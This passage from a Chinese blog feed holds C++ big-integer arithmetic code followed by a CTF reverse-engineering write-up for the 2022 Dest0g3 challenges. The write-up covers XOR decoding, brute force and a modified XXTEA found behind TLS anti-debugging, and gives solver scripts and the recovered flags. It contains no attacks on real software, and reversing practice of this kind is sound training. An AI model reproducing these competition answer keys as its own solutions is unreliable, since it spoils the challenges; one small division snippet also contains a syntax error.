class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">BIG_INT <span class="keyword">operator</span> * (<span class="type">const</span> BIG_INT &amp;B) <span class="type">const</span></span><br><span class="line">    &#123;</span><br><span class="line">        BIG_INT C;</span><br><span class="line">        C.a[<span class="number">0</span>] = a[<span class="number">0</span>] + B.a[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= a[<span class="number">0</span>]; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            t = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt;= B.a[<span class="number">0</span>] || t; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(j &lt;= B.a[<span class="number">0</span>]) t += a[i] * B.a[j] + C.a[i + j - <span class="number">1</span>];</span><br><span class="line">                C.a[i + j - <span class="number">1</span>] = t % <span class="number">10</span>;</span><br><span class="line">                t /= <span class="number">10</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(C.a[<span class="number">0</span>] &gt; <span class="number">1</span> &amp;&amp; C.a[C.a[<span class="number">0</span>]] == <span class="number">0</span>) C.a[<span class="number">0</span>]--;</span><br><span class="line">        <span class="keyword">return</span> C;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></div></figure><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> t[<span class="number">10010</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">BIG_INT</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10010</span>];</span><br><span class="line">    <span class="built_in">BIG_INT</span>()&#123;<span class="built_in">memset</span>(a, <span class="number">0</span>, <span class="built_in">sizeof</span>(a));&#125;</span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, t);</span><br><span class="line">        a[<span class="number">0</span>] = <span class="built_in">strlen</span>(t);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; a[<span class="number">0</span>]; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> j = a[<span class="number">0</span>] - i;</span><br><span class="line">            a[j] = t[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">print</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = a[<span class="number">0</span>]; i &gt;= <span class="number">1</span>; i--)</span><br><span class="line">            cout &lt;&lt; a[i];</span><br><span class="line">        cout &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> <span class="keyword">operator</span> &lt; (<span class="type">const</span> BIG_INT &amp;B) <span class="type">const</span> <span class="comment">// A &lt; B</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(a[<span class="number">0</span>] != B.a[<span class="number">0</span>]) <span class="keyword">return</span> a[<span class="number">0</span>] &lt; B.a[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = a[<span class="number">0</span>]; i &gt;= <span class="number">1</span>; i--)</span><br><span class="line">            <span class="keyword">if</span>(a[i] != B.a[i]) <span class="keyword">return</span> a[i] &lt; B.a[i];</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> <span class="keyword">operator</span> = (<span class="type">const</span> BIG_INT &amp;B)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = B.a[<span class="number">0</span>]; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">            a[i] = B.a[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> <span class="keyword">operator</span> == (<span class="type">const</span> BIG_INT &amp;B) <span class="type">const</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(a[<span class="number">0</span>] != B.a[<span class="number">0</span>]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = a[<span class="number">0</span>]; i &gt;= <span class="number">1</span>; i--)</span><br><span class="line">            <span class="keyword">if</span>(a[i] != B.a[i]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    BIG_INT <span class="keyword">operator</span> - (<span class="type">const</span> BIG_INT &amp;B) <span class="type">const</span></span><br><span class="line">    &#123;</span><br><span class="line">        BIG_INT C;</span><br><span class="line">        <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= a[<span class="number">0</span>]; i++)</span><br><span class="line">        &#123;<span class="comment">//A - B</span></span><br><span class="line">            t = a[i] - t;</span><br><span class="line">            <span class="keyword">if</span>(i &lt;= B.a[<span class="number">0</span>]) t -= B.a[i];</span><br><span class="line">            C.a[++C.a[<span class="number">0</span>]] = (t + <span class="number">10</span>) % <span class="number">10</span>;</span><br><span class="line">            <span class="keyword">if</span>(t &lt; <span class="number">0</span>) t = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> t = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(C.a[<span class="number">0</span>] &gt; <span class="number">1</span> &amp;&amp; C.a[C.a[<span class="number">0</span>]] == <span class="number">0</span>) C.a[<span class="number">0</span>]--;</span><br><span class="line">        <span class="keyword">return</span> C;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    BIG_INT <span class="keyword">operator</span> * (<span class="type">const</span> <span class="type">int</span> &amp;b) <span class="type">const</span></span><br><span class="line">    &#123;</span><br><span class="line">        BIG_INT C;</span><br><span class="line">        <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= a[<span class="number">0</span>] || t; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(i &lt;= a[<span class="number">0</span>]) t += a[i] * b;</span><br><span class="line">            C.a[++C.a[<span class="number">0</span>]] = t % <span class="number">10</span>;</span><br><span class="line">            t /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(C.a[<span class="number">0</span>] &gt; <span class="number">1</span> &amp;&amp; C.a[C.a[<span class="number">0</span>]] == <span class="number">0</span>) C.a[<span class="number">0</span>]--;</span><br><span class="line">        <span class="keyword">return</span> C;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    BIG_INT <span class="keyword">operator</span> * (<span class="type">const</span> BIG_INT &amp;B) <span class="type">const</span></span><br><span class="line">    &#123;</span><br><span class="line">        BIG_INT C;</span><br><span class="line">        C.a[<span class="number">0</span>] = a[<span class="number">0</span>] + B.a[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= a[<span class="number">0</span>]; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            t = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt;= B.a[<span class="number">0</span>] || t; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(j &lt;= B.a[<span class="number">0</span>]) t += a[i] * B.a[j] + C.a[i + j - <span class="number">1</span>];</span><br><span class="line">                C.a[i + j - <span class="number">1</span>] = t % <span class="number">10</span>;</span><br><span class="line">                t /= <span class="number">10</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(C.a[<span class="number">0</span>] &gt; <span class="number">1</span> &amp;&amp; C.a[C.a[<span class="number">0</span>]] == <span class="number">0</span>) C.a[<span class="number">0</span>]--;</span><br><span class="line">        <span class="keyword">return</span> C;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="keyword">operator</span> % (<span class="type">const</span> <span class="type">int</span> &amp;b) <span class="type">const</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = a[<span class="number">0</span>]; i &gt;= <span class="number">1</span>; i--)</span><br><span class="line">        &#123;</span><br><span class="line">            t = t * <span class="number">10</span> + a[i];</span><br><span class="line">            t %= b;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> t;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    BIG_INT <span class="keyword">operator</span> / (<span class="type">const</span> <span class="type">int</span> &amp;b) <span class="type">const</span></span><br><span class="line">    &#123;</span><br><span class="line">        BIG_INT C;</span><br><span class="line">        <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = a[<span class="number">0</span>]; i &gt;= <span class="number">1</span>; i--)</span><br><span class="line">        &#123;</span><br><span class="line">            t = t * <span class="number">10</span> + a[i];</span><br><span class="line">            C.a[<span class="number">0</span>] = <span class="built_in">max</span>(C.a[<span class="number">0</span>], i);</span><br><span class="line">            C.a[i] = t / b;</span><br><span class="line">            t %= b;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(C.a[<span class="number">0</span>] &gt; <span class="number">1</span> &amp;&amp; C.a[C.a[<span class="number">0</span>]] == <span class="number">0</span>) C.a[<span class="number">0</span>]--;</span><br><span class="line">        <span class="keyword">return</span> C;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;A, B, C;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">(<span class="type">const</span> BIG_INT &amp;x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !(x.a[<span class="number">1</span>] % <span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h3 id="除法（高精对低精）"   >          <a href="#除法（高精对低精）" class="heading-link"><i class="fas fa-link"></i></a><a href="#除法（高精对低精）" class="headerlink" title="除法（高精对低精）"></a>除法（高精对低精）</h3>      <figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">div</span><span class="params">(<span class="type">int</span> A[], <span class="type">int</span> C[], <span class="type">int</span> b, <span class="type">int</span> &amp;r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> &amp;len = A[<span class="number">0</span>], &amp;clen = C[<span class="number">0</span>];</span><br><span class="line">clen = len;</span><br><span class="line">r = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = len, i &gt;= <span class="number">1</span>; i--)&#123;</span><br><span class="line">r = r * <span class="number">10</span> + A[i];</span><br><span class="line">C[clen + i - len] = r / b;</span><br><span class="line">r %= b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(clen &gt; <span class="number">1</span> &amp;&amp; C[clen] == <span class="number">0</span>) clen--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>520迎新赛wp</title>
      <link href="/2022/05/20/520%E8%BF%8E%E6%96%B0%E8%B5%9Bwp/"/>
      <url>/2022/05/20/520%E8%BF%8E%E6%96%B0%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[        <h1 id="2022dest0g3（RE）"   >          <a href="#2022dest0g3（RE）" class="heading-link"><i class="fas fa-link"></i></a><a href="#2022dest0g3（RE）" class="headerlink" title="2022dest0g3（RE）"></a>2022dest0g3（RE）</h1>              <h2 id="Day1"   >          <a href="#Day1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Day1" class="headerlink" title="Day1"></a>Day1</h2>              <h3 id="simpleXOR"   >          <a href="#simpleXOR" class="heading-link"><i class="fas fa-link"></i></a><a href="#simpleXOR" class="headerlink" title="simpleXOR"></a>simpleXOR</h3>      <p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132219994.png" alt="image-20230112174210837"></p><p>64位无壳，丢进ida</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132219995.png" alt="image-20230112174216992"></p><p>将<code>input[i]</code>与<code>i</code>相加再与247异或，然后和ans比较出flag</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> flag[] = &#123;</span><br><span class="line">        <span class="number">179</span>, <span class="number">145</span>, <span class="number">130</span>,<span class="number">128</span>,<span class="number">195</span>,<span class="number">155</span>,<span class="number">206</span>,<span class="number">117</span>,<span class="number">207</span>,<span class="number">156</span>,<span class="number">154</span>,<span class="number">133</span>,<span class="number">133</span>,</span><br><span class="line">        <span class="number">205</span>,<span class="number">184</span>,<span class="number">132</span>,<span class="number">170</span>,<span class="number">125</span>,<span class="number">189</span>,<span class="number">187</span>,<span class="number">177</span>,<span class="number">181</span>,<span class="number">150</span>,<span class="number">113</span>,<span class="number">141</span>,<span class="number">158</span>,<span class="number">134</span>,</span><br><span class="line">        <span class="number">191</span>,<span class="number">115</span>,<span class="number">168</span>,<span class="number">163</span>,<span class="number">156</span>,<span class="number">131</span>,<span class="number">101</span>,<span class="number">158</span>,<span class="number">87</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">36</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, ((flag[i]^<span class="number">247</span>)-i));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>解出Dest0g3{0bcgf-AdMy892-KobPW-hB6LTqG}</p>        <h3 id="hi"   >          <a href="#hi" class="heading-link"><i class="fas fa-link"></i></a><a href="#hi" class="headerlink" title="hi"></a>hi</h3>      <p>64位无壳，ida</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132219996.png" alt="image-20220521004901488"></p><p>首先对enc进行拆解</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> enc[<span class="number">6</span>];</span><br><span class="line">    enc[<span class="number">0</span>] = <span class="number">0x9F8E7A1CC6486497</span>LL;</span><br><span class="line">    enc[<span class="number">1</span>] = <span class="number">0x69EEF382E760BD46</span>LL;</span><br><span class="line">    enc[<span class="number">2</span>] = <span class="number">0xB9C017E2E30EF749</span>LL;</span><br><span class="line">    enc[<span class="number">3</span>] = <span class="number">0x98410148A430392C</span>LL;</span><br><span class="line">    enc[<span class="number">4</span>] = <span class="number">0xE80E7411E5B5A939</span>LL;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> * p = (<span class="type">unsigned</span> <span class="type">char</span>*)enc;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, *(p++));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>得出enc数组后开始爆破</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-ACh]</span></span><br><span class="line"><span class="type">int</span> v1; <span class="comment">// [rsp+8h] [rbp-A8h]</span></span><br><span class="line"><span class="type">char</span> str[<span class="number">100</span>]; <span class="comment">// [rsp+40h] [rbp-70h] BYREF</span></span><br><span class="line"><span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+A8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="built_in">memset</span>(str, <span class="number">0</span>, <span class="built_in">sizeof</span>(str));</span><br><span class="line"> <span class="type">unsigned</span> <span class="type">char</span> enc[<span class="number">45</span>] = &#123;</span><br><span class="line"> <span class="number">0x97</span>, <span class="number">0x64</span>, <span class="number">0x48</span>, <span class="number">0xC6</span>, <span class="number">0x1C</span>, <span class="number">0x7A</span>, <span class="number">0x8E</span>, <span class="number">0x9F</span>, <span class="number">0x46</span>, <span class="number">0xBD</span>, <span class="number">0x60</span>, <span class="number">0xE7</span>, <span class="number">0x82</span>, <span class="number">0xF3</span>, <span class="number">0xEE</span>, <span class="number">0x69</span>,<span class="number">0x49</span>, <span class="number">0xF7</span>, <span class="number">0x0E</span>, <span class="number">0xE3</span>, <span class="number">0xE2</span>, <span class="number">0x17</span>, <span class="number">0xC0</span>, <span class="number">0xB9</span>, <span class="number">0x2C</span>, <span class="number">0x39</span>, <span class="number">0x30</span>, <span class="number">0xA4</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0x41</span>, <span class="number">0x98</span>, <span class="number">0x39</span>, <span class="number">0xA9</span>, <span class="number">0xB5</span>, <span class="number">0xE5</span>, <span class="number">0x11</span>, <span class="number">0x74</span>, <span class="number">0x0E</span>, <span class="number">0xE8</span>, <span class="number">0xAC</span>, <span class="number">0xFD</span>, <span class="number">0x8B</span>, <span class="number">0xA5</span>, <span class="number">0x6D</span> &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="type">unsigned</span> <span class="type">char</span> x[<span class="number">45</span>] = &#123;</span><br><span class="line"> <span class="number">0x7B</span>, <span class="number">0x51</span>, <span class="number">0xF3</span>, <span class="number">0x5A</span>, <span class="number">0xCC</span>, <span class="number">0x39</span>, <span class="number">0xF9</span>, <span class="number">0x92</span>, <span class="number">0x1C</span>, <span class="number">0x9E</span>, <span class="number">0x58</span>, <span class="number">0x69</span>, <span class="number">0x9D</span>, <span class="number">0xF7</span>, <span class="number">0xFD</span>, <span class="number">0x4A</span>, <span class="number">0x3E</span>, <span class="number">0xFB</span>, <span class="number">0x1D</span>, <span class="number">0x2C</span>, <span class="number">0x4D</span>, <span class="number">0x0C</span>, <span class="number">0x70</span>, <span class="number">0xB1</span>, <span class="number">0x3B</span>, <span class="number">0x8D</span>, <span class="number">0x25</span>, <span class="number">0xED</span>, <span class="number">0x91</span>, <span class="number">0xB1</span>, <span class="number">0x73</span>, <span class="number">0x8D</span>, <span class="number">0x82</span>, <span class="number">0xE6</span>, <span class="number">0xE7</span>, <span class="number">0x50</span>, <span class="number">0x20</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x3C</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0xA6</span>, <span class="number">0x9D</span>, <span class="number">0x32</span> &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">44</span>; ++i)</span><br><span class="line"> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">0xff</span>; j++)</span><br><span class="line">  &#123;</span><br><span class="line">   v1 = <span class="number">23</span> * j;</span><br><span class="line">   <span class="keyword">if</span> (<span class="built_in">static_cast</span>&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt;((<span class="type">char</span>)v1 + x[i]) == <span class="built_in">static_cast</span>&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt;(enc[i]))</span><br><span class="line">   &#123;</span><br><span class="line">    cout &lt;&lt; (<span class="type">char</span>)j; <span class="keyword">break</span>;</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>得出Dest0g3{f982cd79-d7a3-0874-aa0b-a5b37e4445c8}</p>        <h2 id="Day2"   >          <a href="#Day2" class="heading-link"><i class="fas fa-link"></i></a><a href="#Day2" class="headerlink" title="Day2"></a>Day2</h2>              <h3 id="tttea"   >          <a href="#tttea" class="heading-link"><i class="fas fa-link"></i></a><a href="#tttea" class="headerlink" title="tttea"></a>tttea</h3>      <p>32位ida， 无壳</p><p>输入为str，经过函数sub_40116D后与byte_40A01做比较</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202205240027556.png" alt="image-20220523234616146"></p><p>进入sub_40116D,发现这是个xxtea加密，v4  &gt;&gt; 2代表着组元为4， 即将44位的数组分成11段，写脚本的时候需注意类型转换。</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202205240027642.png" alt="image-20220523234734930"></p><p>为xxtea加密，不过与原版修改了移位的值和delta</p><p>注意，有TLS反调试</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202207021409892.png" alt="image-20220702140948855"></p><p>因此对其进行分析</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202207021439019.png" alt="image-20220702143905990"></p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202207021439281.png" alt="image-20220702143938247"></p><p>首先将0040A018的值改为0x66403319 </p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132219997.png" alt="image-20220702144025811"></p><p>然后再与上0x12345678</p><p>即真正的delta为0x66403319 ^ 0x12345678,即0x74746561</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x74746561</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z&gt;&gt;6^y<span class="string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z))) </span></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> key[] = &#123;<span class="number">0x61</span>, <span class="number">0x65</span>, <span class="number">0x74</span>, <span class="number">0x74</span>&#125;;<span class="comment">//delta</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">btea</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">int</span> n, <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>)            <span class="comment">/* Coding Part */</span></span><br><span class="line">    &#123;</span><br><span 